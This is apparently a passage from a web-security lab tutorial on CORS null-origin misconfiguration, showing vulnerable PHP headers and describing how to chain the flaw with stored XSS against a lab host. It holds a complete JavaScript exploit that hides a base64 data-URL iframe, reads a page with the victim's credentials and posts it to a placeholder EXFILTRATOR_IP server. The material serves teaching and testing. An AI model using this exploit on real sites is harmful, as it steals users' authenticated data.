#### Why Null Origin?

Allowing requests from the "null" origin in a web application's CORS policy might seem counterintuitive, but there are specific scenarios where this might occur, either intentionally or due to misconfiguration. For example:

1. Local Files and Development: When developers test web applications locally using `file:///` URLs (e.g., opening an HTML file directly in a browser without a server), the browser typically sets the origin to "null". In such cases, developers might temporarily allow the "null" origin in CORS policies to facilitate testing.
2. Sandboxed Iframes: Web applications using sandboxed iframes (with the `sandbox` attribute) might encounter "null" origins if the iframe's content comes from a different domain. The "null" origin is a security measure in highly restricted environments.
3. Specific Use Cases: Some applications might have particular use cases that need to support interactions from non-web-browser environments or unconventional clients that don't send a standard origin. Allowing the "null" origin might be a workaround, although it's generally not recommended due to security concerns.
#### Exploiting Null Origin

Compared to the previous techniques, exploiting a null origin vulnerability typically involves taking advantage of scenarios where an application incorrectly trusts the "null" origin of the request. This can happen when an application's CORS policy is misconfigured to accept requests from the "null" origin. For example, below is the vulnerable code of [http://corssop.thm/null.php](http://corssop.thm/null.php)

```php
<?php
header('Access-Control-Allow-Origin: null');
header('Access-Control-Allow-Credentials: true');
?>
```


The "null" origin usually occurs when an HTML page is loaded locally using the `file:///` protocol or inside an `iframe`.

![[84dd592fc588146fe095dc5b5c3927c8.png]]
To exploit the vulnerable code above, an attacker can create a malicious webpage with an `iframe` containing a `javascript` code that makes cross-origin requests to the target application.

#### XSS + CORS

We can use the vulnerable application at [http://corssop.thm/xss.php](http://corssop.thm/xss.php) to chain XSS with CORS. The application is designed to accept JavaScript or HTML code and then save it to the database. This means you can inject JavaScript or HTML code into the application, and once the victim visits the application, the payload will be executed.

![Sample XSS payload with a basic alert box](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/7014d79bc18957e4809e6dd67e23fd11.png)  

Below is a sample exploit code designed to exfiltrate the data from `null.php` while using the victim's session. Make sure to change the EXFILTRATOR_IP variable with your IP address.



```html
<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
    <iframe id="exploitFrame" style="display:none;"></iframe>
    <textarea id="load" style="width: 1183px; height: 305px;"></textarea>
  </div>

  <script>
    // JavaScript code for the exploit, adapted for inclusion in a data URL
    var exploitCode = `
      <script>
        function exploit() {
          var xhttp = new XMLHttpRequest();
          xhttp.open("GET", "http://corssop.thm/null.php", true);
          xhttp.withCredentials = true;
          xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
              // Assuming you want to exfiltrate data to a controlled server
              var exfiltrate = function(data) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "http://EXFILTRATOR_IP/receiver.php", true);
                xhr.withCredentials = true;
                var body = data;
                var aBody = new Uint8Array(body.length);
                for (var i = 0; i < aBody.length; i++)
                  aBody[i] = body.charCodeAt(i);
                xhr.send(new Blob([aBody]));
              };
              exfiltrate(this.responseText);
            }
          };
          xhttp.send();
        }
        exploit();
      <\/script>
    `;

    // Encode the exploit code for use in a data URL
    var encodedExploit = btoa(exploitCode);

    // Set the iframe's src to the data URL containing the exploit
    document.getElementById('exploitFrame').src = 'data:text/html;base64,' + encodedExploit;
  </script>
```